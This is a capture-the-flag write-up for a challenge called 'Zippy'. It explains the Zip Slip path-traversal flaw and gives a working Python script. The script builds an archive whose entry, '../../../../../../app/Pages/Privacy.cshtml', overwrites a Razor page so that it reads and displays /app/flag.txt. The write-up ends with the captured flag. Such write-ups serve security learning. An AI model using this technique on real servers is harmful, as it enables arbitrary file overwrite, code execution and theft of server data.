# Zippy ❌ 

## Challenge Description
> ![image](https://github.com/user-attachments/assets/0909ec54-5b0f-4a7a-809e-915cc77139cb)


## Approach

1. This service required exploiting a vulnerability known as a "Zip Slip". Understanding the "Zip Slip" Vulnerability:
   - The zip slip vulnerability occurs when a program extracts a .zip archive without properly validating the file paths inside it.
   - By including relative path sequences like `../../` in the filenames within the zip, we can manipulate where files are extracted.
   - This can result in files being extracted outside the intended directory, potentially overwriting sensitive files or placing files in dangerous locations.

2. To exploit this, we’ll craft a .zip file containing a file with a specific path: `../../../../../../app/Pages/Privacy.cshtml`. If extracted, this file could potentially replace the existing Privacy.cshtml page on the server. We’ll use this to make the server reveal a sensitive file’s contents.

3. Here’s a simple Python script to create a zip file that includes our crafted path and custom content for Privacy.cshtml.
   
```python
import zipfile
import os

# Define the malicious path and content for the file
malicious_path = "../../../../../../app/Pages/Privacy.cshtml"
file_content = """@page
@model Slippy.Pages.Pages_Privacy

@{
    string sourceFilePath = "/app/flag.txt"; // Path to the source file
    string content = System.IO.File.ReadAllText(sourceFilePath);
}

@sourceFilePath
@content
"""

# Create the zip file with the malicious path
with zipfile.ZipFile("MaliciousArchive.zip", "w") as zip_file:
    # Write the malicious file into the zip
    zip_file.writestr(malicious_path, file_content)
```

   This script makes a zip file named MaliciousArchive.zip, containing a file crafted to overwrite Privacy.cshtml. The content inside will look for a sensitive file at /app/flag.txt and print its contents on the page.

5. Upload the `MaliciousArchive.zip` to the service. Once it’s processed, if the server is indeed vulnerable, it will replace Privacy.cshtml.

   ![image](https://github.com/user-attachments/assets/74aa559c-7404-434e-a455-b4b65d7c5dc9)

7. Now, navigate to the Privacy page of the service. The page loads, and there it is—the contents of flag.txt, displayed right on the screen.

   ![image](https://github.com/user-attachments/assets/53670656-777e-4718-9c98-b4ed360c94b1)

## Flag
flag{a074eb7973c4c718790baefc096654dd} 



   



